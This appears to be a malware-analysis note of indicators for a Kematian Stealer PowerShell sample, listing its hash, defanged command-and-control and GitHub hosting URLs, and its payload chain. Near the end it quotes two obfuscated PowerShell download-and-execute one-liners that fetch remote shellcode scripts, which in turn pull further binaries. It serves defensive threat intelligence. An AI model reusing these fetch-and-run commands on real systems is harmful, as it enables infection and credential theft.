@@ -1,0 +1,49 @@
+2024-08-21 (WEDNESDAY) KEMATIAN STEALER SAMPLE
+
+AUTHOR:
+
+- Anthony Galiette
+
+NOTES:
+
+- Kematian Stealer was first reported in July 2024 as "a PowerShell based Token-Grabber." [1]
+- Kematian Stealer is actively developed and distributed through GitHub as an open source tool. [2]
+- Various sources reported a Kematian Stealer C2 server control panel at hxxps[:]//64.52.80[.]191:8080/ in July 2024. [3]
+- We noticed the following Kematian Stealer sample submitted to VirusTotal earlier today.
+
+ORIGINAL REFERENCES:
+
+- [1] https://labs.k7computing.com/index.php/kematian-stealer-forked-from-powershell-token-grabber/
+- [2] https://www.cyfirma.com/research/kematian-stealer-a-deep-dive-into-a-new-information-stealer/
+- [3] https://urlscan.io/result/212087c7-68d3-4041-b641-05f7c3df17a4/
+
+KEMATIAN STEALER SAMPLE:
+
+- SHA256 hash: 4f1745dc20453c92c7025b8ffb40e2789070b604624f09117f8b3406fb6c46de
+- File size: 3,147 bytes
+- File location: hxxps[:]//raw.githubusercontent[.]com/43a1723/test/main/download.ps1
+- File type: Unicode text, UTF-8 text
+- File description: PowerShell script for Kematian Stealer
+- First submitted to VirusTotal: 2024-08-21 00:14:25 UTC
+
+CURRENT GITHUB REPOSITORY FOR KEMATIAN STEALER AT THE TIME OF THIS POST:
+
+- hxxps[:]//github[.]com/Pirate-Devs/Kematian
+
+GITHUB ACCOUNT HOSTING VARIOUS REPOSITORIES FOR KEMATIAN STEALER PAYLOADS:
+
+- hxxps[:]//github[.]com/43a1723/
+
+PAYLOAD CHAIN FOR KEMATIAN STEALER FROM GITHUB:
+
+- hxxps[:]//github[.]com/43a1723/test/releases/download/AutoBuild/download.bat
+
+- powershell.exe" I'E'X((New-Object Net.Webclient)."DowNloAdSTRiNg"('hxxps[:]//
+  raw.githubusercontent[.]com/43a1723/test/main/Extras/shellcode.ps1'))
+
+  NOTE: Above script retrieves file from hxxps[:]//github[.]com/43a1723/test/raw/main/Extras/hacklife/main.bin
+
+- powershell.exe" I'E'X((New-Object Net.Webclient)."DowNloAdSTRiNg"('hxxps[:]//
+  raw.githubusercontent[.]com/43a1723/test/main/Extras/shellcode1.ps1')) 
+
+  NOTE: Above script retrieves file from hxxps[:]//anonsharing[.]com/file/299cef131201faea/hack.exe
